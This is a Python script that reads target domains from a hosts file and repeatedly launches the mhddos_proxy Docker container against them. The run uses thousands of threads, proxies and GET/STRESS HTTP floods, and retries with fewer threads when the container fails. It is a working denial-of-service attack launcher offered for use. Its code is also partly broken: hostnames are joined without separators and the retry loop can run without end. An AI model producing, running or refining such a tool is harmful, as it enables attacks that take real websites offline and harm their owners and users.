import os
import subprocess


class Hosts(object):

    def __init__(self, hosts_file):
        self.hosts_file = hosts_file
        self.hosts_list = []

    def create_hosts_file(self):
        file = open(self.hosts_file, "w+")
        file.close()

    def check_if_file_exist(self):
        if os.path.isfile(self.hosts_file):
            return True
        else:
            return False

    def check_if_file_not_empty(self):
        if os.stat(self.hosts_file).st_size == 0:
            print("Hosts file is empty")
            return False
        else:
            return True

    def read_host_file(self):
        with open(self.hosts_file, "r+") as hf:
            line = hf.readlines()
            while line:
                return line

    def add_host_to_list(self, hostname):
        self.hosts_list.append(hostname)

    @staticmethod
    def reformat_host_line(line):
        line = ''.join(line)
        line = line.replace('\n', '')
        return line


def work_with_hosts_file(hosts_file):
    host_file_work = Hosts(hosts_file)
    hosts_file_check = host_file_work.check_if_file_exist()
    if hosts_file_check is True:
        print("Hosts file Exist")
        hosts_file_check_size = host_file_work.check_if_file_not_empty()
        if hosts_file_check_size:
            hosts_file_read = host_file_work.read_host_file()
            for item in hosts_file_read:
                hostname = host_file_work.reformat_host_line(item)
                if hostname not in host_file_work.hosts_list:
                    host_file_work.add_host_to_list(hostname)
            return host_file_work.hosts_list
        else:
            print("Hosts file is empty")
    else:
        print("Error!: Hosts file does not exist!")
        print("Creating hosts file txt: please add hosts to file line by line, for example: www.facebook.com")
        host_file_work.create_hosts_file()


def run_docker_with_hosts(host_line, t):
    docker_cmd = "docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest {host_line} -t {t} --rpc 2000 -p 1200 --http-methods GET STRESS --DEBUG".format(host_line=host_line,
                                                                                                  t=t)
    proc = subprocess.Popen(docker_cmd, shell=True)
    proc.communicate()
    code = proc.returncode
    return code


if __name__ == "__main__":
    t = 5000
    hosts_file = "hosts.txt"
    host_line = ""
    hosts_list = work_with_hosts_file(hosts_file)
    for item in hosts_list:
        host = ''.join(item)
        host_line = host_line + host + ""
    while t != 1000:
        code = run_docker_with_hosts(host_line, t)
        if code > 0:
            t = t - 1000
            continue
